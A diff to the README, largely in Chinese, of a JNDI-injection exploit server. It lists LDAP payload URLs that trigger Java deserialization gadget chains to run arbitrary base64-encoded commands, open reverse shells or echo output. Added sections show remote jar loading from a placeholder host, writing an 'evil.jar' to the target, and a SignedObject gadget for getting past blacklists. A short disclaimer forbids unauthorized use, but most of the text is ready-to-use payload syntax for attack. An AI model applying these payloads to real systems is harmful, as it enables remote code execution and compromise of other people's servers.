@@ -50,38 +50,7 @@ Supported LADP Queries：
 [+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
-    ldap://0.0.0.0:1389/Deserialization/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK3/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK4/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1_1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollections2/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollections4/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollections5/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollections7/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollections7Lite_4/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/C3P092/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/Click1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/AspectJWeaver/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils3183/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2NOCC/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils3/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1183NOCC/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/Jython1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/JSON1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/Groovy1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/Hibernate1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/Hibernate2/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/JavassistWeld1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/JBossInterceptors1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/Jdk7u21variant/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/JRMPClient/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/JRMPClient_Activator/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/JRMPClient_Obj/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/JRMPListener/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
     ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
@@ -174,12 +143,18 @@ Supported LADP Queries：
   * ```CommonsCollections4```
   * ```CommonsCollections5```
   * ```CommonsCollections6```
+  * ```CommonsCollections6Lite```
+  * ```CommonsCollections6Lite_4```
   * ```CommonsCollections7```
+  * ```CommonsCollections7Lite```
+  * ```CommonsCollections8```
+  * ```CommonsCollections9```
+  * ```CommonsCollections10```
   * ```CommonsCollectionsK1```
   * ```CommonsCollectionsK2```
-  * ```CommonsCollectionsK3```
-  * ```CommonsCollectionsK4```
   * ```C3P0```
+  * ```C3P02```
+  * ```C3P03```
   * ```Jdk7u21```
   * ```Jre8u20```
   * ```CVE_2020_2551```
@@ -201,6 +176,10 @@ Supported LADP Queries：
   * ```JRMPClient_Activator```
   * ```JRMPClient_Obj```
   * ```JRMPListener```
+  * 使用示例：
+  ```
+  ldap://0.0.0.0:1389/Deserialization/[GadgetType]/Command/Base64/[base64_encoded_cmd]
+  ```
 * ```WebsphereBypass``` 中的 3 个动作：
   * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
   * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
@@ -270,6 +249,42 @@ ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/whoami
 
 ---
 
+# C3P04的使用
+
+* 远程加载 Jar 包
+  * C3P04 'remoteJar-http://1.1.1.1.com/1.jar'
+* 向服务器写入 Jar 包并加载（不出网）
+  * C3P04 'writeJar-/tmp/evil.jar:./yaml.jar'
+  * C3P04 'localJar-./yaml.jar'
+* C3P0 二次反序列化
+  * C3P04 'c3p0Double-/usr/CC6.ser'
+
+```
+ldap://0.0.0.0:1389/Deserialization/C3P04/Command/Base64/[base64_encoded_cmd]
+```
+---
+
+# SignedObject 二次反序列化 Gadget
+
+用来进行某些场景的绕过（常见如 TemplatesImpl 黑名单，CTF 中常出现的 CC 无数组加黑名单等）
+
+利用链需要调用 SignedObject 的 getObject 方法，因此需要可以调用任意方法、或调用指定类 getter 方法的触发点；
+
+大概包含如下几种可用的常见调用链：
+1. InvokerTransformer 调用任意方法（依赖 CC）
+2. BeanComparator 调用 getter 方法（依赖 CB）
+3. BasicPropertyAccessor$BasicGetter 调用 getter 方法(依赖 Hibernate)
+4. MemberBox 反射调用任意方法（依赖 rhino）
+5. ToStringBean 调用全部 getter 方法（依赖 Rome）
+6. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）
+
+* 利用方式：
+* SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:10000' 20000
+```
+ldap://0.0.0.0:1389/Deserialization/SignedObject/Command/Base64/[base64_encoded_SignedObjectPayload]
+```
+---
+
 # 🏓TODO
 
 1. 本地ClassPath反序列化漏洞利用方式
@@ -286,10 +301,11 @@ ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/whoami
 本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。
 
 # 🐲建议
-不推荐用高版本JDK
+本项目用JDK1.8.0_332开发，不推荐用高于11的JDK，可能会出现错误
 
 # 📷参考
  * https://github.com/veracode-research/rogue-jndi
  * https://github.com/welk1n/JNDI-Injection-Exploit
  * https://github.com/welk1n/JNDI-Injection-Bypass
  * https://github.com/WhiteHSBG/JNDIExploit
+ * https://github.com/su18/ysoserial
